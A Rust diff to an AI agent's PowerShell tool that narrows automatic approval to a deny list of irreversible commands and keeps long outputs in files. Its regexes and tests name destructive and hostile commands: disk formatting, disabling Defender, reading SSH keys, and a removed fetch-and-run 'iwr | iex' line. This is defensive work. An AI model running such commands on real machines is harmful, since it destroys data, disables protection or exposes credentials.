@@ -164,44 +164,33 @@ pub fn on_path(name: &str) -> bool {
     find_program(Path::new(""), name).is_some()
 }
 
-/// Could this PowerShell text change the computer? Only plain looking passes: every command in it is a cmdlet
-/// whose verb looks (Get, Select, Where, Sort, Format, Measure, Test ...) or one of their short names, and nothing
-/// in it redirects, starts a program, or calls into .NET to write.
-// ponytail: a reading of the text, there to catch a change made in passing. It is not a parser, and code the model
-// writes to a file and runs was never held by it. Use PowerShell's own parser (System.Management.Automation.Language)
-// if this has to hold against a command written to get past it.
-fn shell_changes(script: &str) -> bool {
+/// What PowerShell is not run for while commands run automatically. Nobody reads a command then, so nothing is
+/// asked: a command that could change the computer used to wait five minutes for an approval, with the user away
+/// and the window down, and was then dropped. What cannot be put back is refused instead, at once and with the
+/// reason, and the reply finds another way. A restore point brings back the chat's folder and nothing else, so
+/// deleting is held to that folder; and the commands that take the computer itself apart are not run.
+// ponytail: a reading of the text, there to catch a wreck made in passing. It is not a parser, and a script the
+// model writes to a file and runs was never held by it. Use PowerShell's own parser
+// (System.Management.Automation.Language) if this has to hold against a command written to get past it.
+fn shell_wrecks(script: &str) -> Option<&'static str> {
     use std::sync::LazyLock;
-    static STRINGS: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"'[^']*'|"[^"$`]*""#).unwrap());
-    static RISKY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)>|&|`|\.(exe|bat|cmd|ps1|msi|vbs|js)\b|(\.|::)(delete|kill|remove|create|write|move|copy|set|start|invoke|save|terminate|open|append|download|load|exec|run|shellexecute|new)\w*\(").unwrap());
-    static CMDLET: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^([a-z]+)-[a-z]+$").unwrap());
-    const VERBS: &[&str] = &["get", "select", "where", "sort", "format", "measure", "test", "resolve", "compare", "convertto", "convertfrom", "group", "foreach", "split", "join"];
-    const WORDS: &[&str] = &[
-        "gci", "dir", "ls", "gc", "cat", "type", "gi", "gp", "gps", "ps", "gsv", "gcim", "gwmi", "gcm", "gm", "gv", "gl", "pwd", "select", "where", "sort", "ft", "fl", "fw", "measure", "group", "echo", "sls", "foreach", "%", "?",
-        "out-string", "out-null", "out-host", "write-output", "write-host", "hostname", "whoami", "tasklist", "systeminfo", "driverquery", "getmac",
-        "if", "else", "elseif", "for", "while", "do", "switch", "try", "catch", "finally", "return", "in", "param",
-    ];
-    let bare = STRINGS.replace_all(script, "''");
-    if RISKY.is_match(&bare) {
-        return true;
+    static SYSTEM: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r"(?i)\b(format-volume|clear-disk|remove-partition|initialize-disk|stop-computer|restart-computer|shutdown|bcdedit|diskpart|vssadmin|wbadmin|set-mppreference|remove-localuser|disable-computerrestore|reg(\.exe)?\s+delete|remove-item(property)?\s+\S*\b(hklm|hkcu|registry):)|\bformat\s+[a-z]:|\bcipher\s+/w").unwrap()
+    });
+    static DELETES: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)(^|[\s;|{(&])(remove-item|rm|rmdir|rd|del|erase|ri)\b|(\.|::)delete\(").unwrap());
+    static OUTSIDE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b[a-z]:[\\/]|\\\\|\.\.[\\/]|~|\$env:|\$home\b").unwrap());
+    if SYSTEM.is_match(script) {
+        return Some("Not run: this changes the computer itself (its disks, its start-up, its accounts, its protection, or it deletes from the registry) and cannot be undone. Leave it to the user: say what should be run and why.");
     }
-    // A cmdlet anywhere in it, not only at the start of a command: `$x = Remove-Item a` hides one behind a name.
-    let named = |word: &str| !WORDS.contains(&word) && CMDLET.captures(word).is_some_and(|verb| !VERBS.contains(&verb[1].to_ascii_lowercase().as_str()));
-    if bare.split(|c: char| c.is_whitespace() || "|;{}(),=".contains(c)).any(|word| named(&word.to_ascii_lowercase())) {
-        return true;
+    if DELETES.is_match(script) && OUTSIDE.is_match(script) {
+        return Some("Not run: this deletes, and it names a place outside the chat's folder, where nothing can be restored. Delete inside the folder by a relative path (delete_file does it too), and keep a command that deletes apart from one that reads elsewhere. What is outside is the user's to remove.");
     }
-    bare.split(['|', ';', '\n', '{', '}', '(', ')']).any(|part| {
-        let mut words = part.split_whitespace();
-        let (first, second) = (words.next().unwrap_or("").to_ascii_lowercase(), words.next().unwrap_or(""));
-        // A value, an operator or a name being given a value is no command.
-        let command = first.starts_with(|c: char| c.is_ascii_alphabetic() || c == '%' || c == '?') && second != "=" && !first.contains('=');
-        command && !WORDS.contains(&first.as_str()) && !CMDLET.is_match(&first)
-    })
+    None
 }
 
 /// PowerShell on Windows: the one shell let through, for what only it can ask the system (event logs, services,
-/// installed programs, hardware). The user is shown its text whole. With commands running automatically it runs
-/// unasked only while it looks: text that could change the computer asks in every mode. The web has no such
+/// installed programs, hardware). With "Ask me first" the user is shown its text whole. With commands running
+/// automatically it runs unasked, like any program, except for what `shell_wrecks` refuses. The web has no such
 /// thing, because it runs on a server and not on the user's own computer.
 fn shell(ctx: &Ctx, command: &str, argv: Vec<String>) -> Result<Launch, String> {
     let mut words = argv.into_iter().peekable();
@@ -221,7 +210,10 @@ fn shell(ctx: &Ctx, command: &str, argv: Vec<String>) -> Result<Launch, String> 
         return Err(format!("The command names a place that is not read: {}", super::files::CLOSED_WHY));
     }
     let Some(program) = find_program(&ctx.root, command) else { return Err(format!("`{command}` was not found on this machine.")) };
-    let ask = ctx.settings.approval == Approval::Manual || shell_changes(&script);
+    let ask = ctx.settings.approval == Approval::Manual;
+    if let Some(why) = shell_wrecks(&script).filter(|_| !ask) {
+        return Err(why.into());
+    }
     let key = serde_json::to_string(&["powershell", script.as_str()]).unwrap_or_default();
     // Its output is asked for in UTF-8: the console's own code page turns every non-English letter into noise.
     let args = ["-NoProfile", "-NonInteractive", "-NoLogo", "-Command"].iter().map(|flag| flag.to_string()).chain([format!("[Console]::OutputEncoding = [Text.Encoding]::UTF8; {script}")]).collect();
@@ -394,13 +386,45 @@ fn not_run(reason: &str) -> String {
     format!("The command was not run. {reason} Do not retry it — explain what you were trying to do, or suggest a different approach.")
 }
 
+/// A command's output as the program wrote it, every byte up to KEEP_LIMIT, in a file of the chat's folder.
+/// The answer shows the start and the end of a long output. The middle used to be gone: a reply that needed it
+/// ran a five-minute program a second time through PowerShell's `>`, which writes UTF-16, and spent four more
+/// rounds finding that out. Three times in one afternoon.
+pub struct Kept {
+    path: PathBuf,
+    file: Option<std::fs::File>,
+    bytes: u64,
+}
+
+/// More than this is a program that will not stop printing: the file holds the first of it.
+const KEEP_LIMIT: u64 = 64 * 1024 * 1024;
+
+impl Kept {
+    fn take(&mut self, chunk: &[u8]) {
+        use std::io::Write;
+        if self.bytes < KEEP_LIMIT {
+            if self.file.is_none() {
+                let _ = std::fs::create_dir_all(self.path.parent().unwrap_or(Path::new("")));
+                self.file = std::fs::File::create(&self.path).ok();
+            }
+            if let Some(file) = &mut self.file {
+                let _ = file.write_all(chunk);
+            }
+        }
+        self.bytes += chunk.len() as u64;
+    }
+}
+
 /// Reads a pipe to the end into a shared buffer, keeping only the newest part of a huge log.
-fn pump(mut pipe: impl tokio::io::AsyncRead + Unpin + Send + 'static, into: Arc<Mutex<String>>) -> tokio::task::JoinHandle<()> {
+fn pump(mut pipe: impl tokio::io::AsyncRead + Unpin + Send + 'static, into: Arc<Mutex<String>>, keep: Option<Arc<Mutex<Kept>>>) -> tokio::task::JoinHandle<()> {
     tokio::spawn(async move {
         let mut buf = [0u8; 8192];
         while let Ok(n) = pipe.read(&mut buf).await {
             if n == 0 {
                 break;
+            }
+            if let Some(keep) = &keep {
+                keep.lock().unwrap().take(&buf[..n]);
             }
             let mut log = into.lock().unwrap();
             log.push_str(&String::from_utf8_lossy(&buf[..n]));
@@ -424,9 +448,10 @@ impl Drop for TreeGuard {
 }
 
 /// Runs to completion or to the limit (None waits as long as it takes). Returns (exit code, combined output, timed out).
-async fn run_to_end(mut child: Child, limit: Option<Duration>) -> (Option<i32>, String, bool) {
+/// With `keep`, every byte of the output also goes to that file, and how many there were comes back in it.
+async fn run_to_end(mut child: Child, limit: Option<Duration>, keep: Option<Arc<Mutex<Kept>>>) -> (Option<i32>, String, bool) {
     let log = Arc::new(Mutex::new(String::new()));
-    let readers = [child.stdout.take().map(|p| pump(p, log.clone())), child.stderr.take().map(|p| pump(p, log.clone()))];
+    let readers = [child.stdout.take().map(|p| pump(p, log.clone(), keep.clone())), child.stderr.take().map(|p| pump(p, log.clone(), keep.clone()))];
     let pid = child.id();
     let mut guard = TreeGuard(pid);
     let waited = match limit {
@@ -465,6 +490,8 @@ pub struct Ran {
     pub took: Duration,
     /// Set when the program could not be started at all.
     pub error: Option<String>,
+    /// Where the whole output is, from the chat's folder, and its size: set when the answer shows less than all of it.
+    pub kept: Option<(String, u64)>,
 }
 
 /// Approves and runs one program to the end, shared by run_command, run_tests and build_project. `limit` None waits as long as it takes.
@@ -472,6 +499,11 @@ pub struct Ran {
 /// `stdin` is text for the program's standard input: `python -` runs it as a script, in one call and with no file
 /// left behind. A reply wrote some fifty one-off scripts as files and ran each in a second round.
 pub async fn execute(ctx: &Ctx, program: &str, argv: Vec<String>, reason: &str, limit: Option<Duration>, stdin: Option<&str>) -> Result<Ran, Output> {
+    execute_keeping(ctx, program, argv, reason, limit, stdin, false).await
+}
+
+/// `execute`, and with `keep` the whole output is left in `outputs/` when it is longer than the answer shows.
+async fn execute_keeping(ctx: &Ctx, program: &str, argv: Vec<String>, reason: &str, limit: Option<Duration>, stdin: Option<&str>, keep: bool) -> Result<Ran, Output> {
     let mut launch = prepare(ctx, program.trim(), argv).map_err(Output::fail)?;
     let short = match stdin {
         Some(text) => format!("{} <<stdin ({} lines)", launch.display, text.lines().count()),
@@ -488,7 +520,7 @@ pub async fn execute(ctx: &Ctx, program: &str, argv: Vec<String>, reason: &str, 
     launch.display = short;
     let mut child = match command(ctx, &launch).env("CI", "1").stdin(if stdin.is_some() { Stdio::piped() } else { Stdio::null() }).spawn() {
         Ok(child) => child,
-        Err(e) => return Ok(Ran { display: launch.display, code: None, out: String::new(), timed_out: false, took: Duration::ZERO, error: Some(start_error(&e, &ctx.root)) }),
+        Err(e) => return Ok(Ran { display: launch.display, code: None, out: String::new(), timed_out: false, took: Duration::ZERO, error: Some(start_error(&e, &ctx.root)), kept: None }),
     };
     if let (Some(text), Some(mut pipe)) = (stdin, child.stdin.take()) {
         // Written from the side: a program that prints before it has read everything must not hold the write up.
@@ -498,8 +530,27 @@ pub async fn execute(ctx: &Ctx, program: &str, argv: Vec<String>, reason: &str, 
         });
     }
     let started = Instant::now();
-    let (code, out, timed_out) = run_to_end(child, limit).await;
-    Ok(Ran { display: launch.display, code, out, timed_out, took: started.elapsed(), error: None })
+    // Named for the moment and the program: `outputs/124857-luau.txt`.
+    let stem: String = base_name(&launch.program.to_string_lossy()).chars().filter(|c| c.is_ascii_alphanumeric()).take(24).collect();
+    let stamp = chrono::Local::now().format("%H%M%S").to_string();
+    // Two runs in one second, or the same second of another day: the next free name.
+    let name = (1..).map(|n| if n == 1 { format!("outputs/{stamp}-{stem}.txt") } else { format!("outputs/{stamp}-{stem}-{n}.txt") }).find(|name| !ctx.root.join(name).exists()).unwrap_or_default();
+    let keeper = keep.then(|| Arc::new(Mutex::new(Kept { path: ctx.root.join(&name), file: None, bytes: 0 })));
+    let (code, out, timed_out) = run_to_end(child, limit, keeper.clone()).await;
+    let kept = keeper.and_then(|keeper| {
+        let mut kept = keeper.lock().unwrap();
+        // Closed before it is named or removed.
+        kept.file = None;
+        if out.trim().chars().count() > MAX_OUTPUT {
+            Some((name, kept.bytes))
+        } else {
+            // All of it is in the answer: no file is left behind, nor the folder if this was its only one.
+            let _ = std::fs::remove_file(&kept.path);
+            let _ = kept.path.parent().map(std::fs::remove_dir);
+            None
+        }
+    });
+    Ok(Ran { display: launch.display, code, out, timed_out, took: started.elapsed(), error: None, kept })
 }
 
 /// Keeps the first HEAD_CHARS and the newest part of a long output, and counts the middle, as the web's OutputBuffer does.
@@ -558,7 +609,11 @@ fn report(ran: &Ran) -> Output {
         parts.push("\n(no output)".to_string());
     }
     if out.chars().count() > MAX_OUTPUT {
-        parts.push("\n(output was long; the start and the end are shown, the middle is omitted)".to_string());
+        parts.push(match &ran.kept {
+            Some((path, bytes)) if *bytes > KEEP_LIMIT => format!("\n(output was long: the start and the end are shown. The program printed {}, and the first {} of it is in {path}, as the program wrote it. Search it with search_files or open it from a script; do not run the program again for it.)", crate::context::format_size(*bytes), crate::context::format_size(KEEP_LIMIT)),
+            Some((path, bytes)) => format!("\n(output was long: the start and the end are shown. ALL of it, {}, is in {path}, as the program wrote it. Search it with search_files, read part of it with read_file, or open it from a script; do not run the program again for it.)", crate::context::format_size(*bytes)),
+            None => "\n(output was long; the start and the end are shown, the middle is omitted)".to_string(),
+        });
     }
     Output { ok, text: parts.join("\n"), summary, ..Default::default() }
 }
@@ -580,7 +635,7 @@ pub async fn run_command(ctx: &Ctx, args: &Value) -> Output {
         }
     }
     let limit = timeout_for(command, &argv, num_arg(args, "timeout_ms"));
-    match execute(ctx, command, argv, str_arg(args, "reason"), Some(limit), Some(stdin.as_str()).filter(|text| !text.is_empty())).await {
+    match execute_keeping(ctx, command, argv, str_arg(args, "reason"), Some(limit), Some(stdin.as_str()).filter(|text| !text.is_empty()), true).await {
         Ok(ran) => report(&ran),
         Err(refused) => refused,
     }
@@ -681,10 +736,10 @@ impl Procs {
     pub async fn adopt(&self, owner: PathBuf, display: String, mut child: Child, wake: crate::agent::Emitter, grace: Duration) -> (String, Option<i32>, String) {
         let log = Arc::new(Mutex::new(String::new()));
         if let Some(p) = child.stdout.take() {
-            pump(p, log.clone());
+            pump(p, log.clone(), None);
         }
         if let Some(p) = child.stderr.take() {
-            pump(p, log.clone());
+            pump(p, log.clone(), None);
         }
         let exit = Arc::new(Mutex::new(None));
         let ended = Arc::new(Mutex::new(None));
@@ -802,7 +857,7 @@ pub async fn start_process(ctx: &Ctx, args: &Value) -> Output {
     let (id, died, shown) = ctx.procs.adopt(owner, launch.display.clone(), child, ctx.emit.clone(), START_GRACE).await;
     let shown = shown.trim();
     if let Some(code) = died {
-        return Output { ok: false, text: format!("{} exited immediately (code {code}).\n\n{}\n\nFix the cause before trying again.", launch.display, or_text(shown, "(no output)")), summary: format!("Failed to start: {}", launch.display), ..Default::default() };
+        return Output { ok: false, text: format!("{} exited immediately (code {code}).\n\n{}\n\nFix the cause before trying again.", launch.display, or_text(shown, "(no output)")), summary: format!("Exited at once (code {code}): {}", launch.display), ..Default::default() };
     }
     Output::ok(format!("Started {} — id {id}, still running.\n\n{}\n\nRead more with read_process, and stop it with stop_process when done.", launch.display, or_text(shown, "(no output yet)")), format!("Started {}", launch.display))
 }
@@ -950,8 +1005,8 @@ mod tests {
     use super::*;
 
     #[test]
-    fn powershell_runs_unasked_only_while_it_looks() {
-        for looks in [
+    fn powershell_is_refused_only_what_cannot_be_put_back() {
+        for runs in [
             "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
             "Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='Application Error'; Level=2} -MaxEvents 20 | Format-List TimeCreated, Message",
             r"Get-ChildItem $env:LOCALAPPDATA\Roblox\logs | Sort-Object LastWriteTime -Descending | Select-Object -First 5 Name, Length",
@@ -959,14 +1014,18 @@ mod tests {
             r"(Get-Item 'C:\x y\a.dll').VersionInfo.FileVersion",
             "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version",
             "$logs = Get-ChildItem $env:TEMP; $logs.Count",
+            // What used to ask: a program run with its output sent to a file, a file's length, a delete inside the folder.
+            r"tools\luau-win\luau.exe analysis\run.luau > analysis\out.txt 2> analysis\err.txt; (Get-Item analysis\out.txt).Length",
+            "Remove-Item analysis/tmp -Recurse", "rm x", "Get-Process; del a", "New-Item a", "[IO.File]::WriteAllText('a','b')", "$x = Get-Item a; $x.Delete()",
+            "Get-ChildItem -Recurse | Format-Table Name", r"Copy-Item C:\tools\a.dll lib\a.dll",
         ] {
-            assert!(!shell_changes(looks), "{looks}");
+            assert_eq!(shell_wrecks(runs), None, "{runs}");
         }
-        for changes in [
-            r"Remove-Item C:\temp -Recurse", "rm x", "Get-Process | Stop-Process", "Get-Content a > b", "[IO.File]::WriteAllText('a','b')", "iwr http://x | iex", "Start-Process notepad", "notepad",
-            r"C:\tools\thing.exe /run", r"Set-ItemProperty HKCU:\x y 1", r"& 'C:\a b\run'", "$x = Get-Item a; $x.Delete()", "$x = Remove-Item a", "New-Item a", "Get-Process; del a",
+        for wrecks in [
+            r"Remove-Item C:\temp -Recurse", r"rm ..\..\other -Recurse", "del $env:USERPROFILE\\notes.txt", "Get-ChildItem ~ | Remove-Item", r"[IO.File]::Delete('C:\x\a')",
+            "Format-Volume -DriveLetter D", "shutdown /s /t 0", "Restart-Computer -Force", r"reg delete HKCU\Software\x /f", r"Remove-Item HKCU:\Software\x", "Set-MpPreference -DisableRealtimeMonitoring $true", "bcdedit /set x",
         ] {
-            assert!(shell_changes(changes), "{changes}");
+            assert!(shell_wrecks(wrecks).is_some(), "{wrecks}");
         }
     }
 
@@ -980,16 +1039,32 @@ mod tests {
             assert!(!prep(Approval::Manual, "tasklist", &[]).ok().unwrap().ask);
             let look = prep(Approval::Auto, "powershell", &["-NoProfile", "-Command", "Get-Process | Select-Object -First 3"]).ok().unwrap();
             assert!(!look.ask && look.display == "powershell Get-Process | Select-Object -First 3" && look.args.last().unwrap().ends_with("; Get-Process | Select-Object -First 3"));
-            // Asked about: anything in "Ask me first", and a change in any mode. One line with quotes stays whole.
-            assert!(prep(Approval::Manual, "powershell", &["Get-Process"]).ok().unwrap().ask);
+            // Asked about: everything in "Ask me first", nothing when commands run automatically. One line with quotes stays whole.
+            assert!(prep(Approval::Manual, "powershell", &["Get-Process"]).ok().unwrap().ask && prep(Approval::Manual, "powershell", &[r"Remove-Item C:\x"]).ok().unwrap().ask);
             let change = prep(Approval::Auto, "powershell Remove-Item 'a b'", &[]).ok().unwrap();
-            assert!(change.ask && change.display == "powershell Remove-Item 'a b'");
+            assert!(!change.ask && change.display == "powershell Remove-Item 'a b'");
+            assert!(prep(Approval::Auto, "powershell", &[r"Remove-Item C:\Users\x -Recurse"]).err().unwrap().starts_with("Not run: this deletes"));
             assert!(prep(Approval::Auto, "powershell", &["-EncodedCommand", "AAAA"]).is_err() && prep(Approval::Auto, "powershell", &["Get-Content ~/.ssh/id_rsa"]).is_err());
             assert!(prep(Approval::Auto, "cmd", &["/c", "dir"]).err().unwrap().contains("use powershell"));
         }
         // A redirect is a shell's doing: said before the program takes `>out.txt` for a file to open.
         assert!(prep(Approval::Auto, "python", &["a.py", ">out.txt"]).err().unwrap().starts_with("There is no shell here, so `>out.txt`"));
         assert!(prep(Approval::Auto, "python a.py 2>&1", &[]).is_err() && prep(Approval::Auto, "python", &["-c", "print(1 > 0)"]).is_ok());
+    }
+
+    /// A long output is all in a file the answer names; a short one leaves no file behind.
+    #[tokio::test(flavor = "multi_thread")]
+    async fn a_long_output_is_kept_whole_in_a_file() {
+        let dir = crate::tools::scratch("kept");
+        let ctx = crate::tools::test_ctx(&dir, Approval::Auto);
+        let long = run_command(&ctx, &json!({ "command": "python", "args": ["-c", "for i in range(9000): print('line', i)"] })).await;
+        let named = long.text.split("is in ").nth(1).and_then(|rest| rest.split(',').next()).unwrap_or_default().to_string();
+        assert!(long.ok && named.starts_with("outputs/") && named.ends_with(".txt") && named.contains("-python") && long.text.contains("do not run the program again"), "{}", &long.text[long.text.len().saturating_sub(400)..]);
+        let whole = std::fs::read_to_string(dir.join(&named)).unwrap();
+        assert!(whole.lines().count() == 9000 && whole.contains("line 4500") && !long.text.contains("line 4500"));
+        let short = run_command(&ctx, &json!({ "command": "python", "args": ["-c", "print('one line')"] })).await;
+        assert!(short.ok && !short.text.contains("outputs/") && std::fs::read_dir(dir.join("outputs")).unwrap().count() == 1);
+        let _ = std::fs::remove_dir_all(dir);
     }
 
     /// A script written as the argument after the dash is run as the script it is, and a dash with no script is refused.
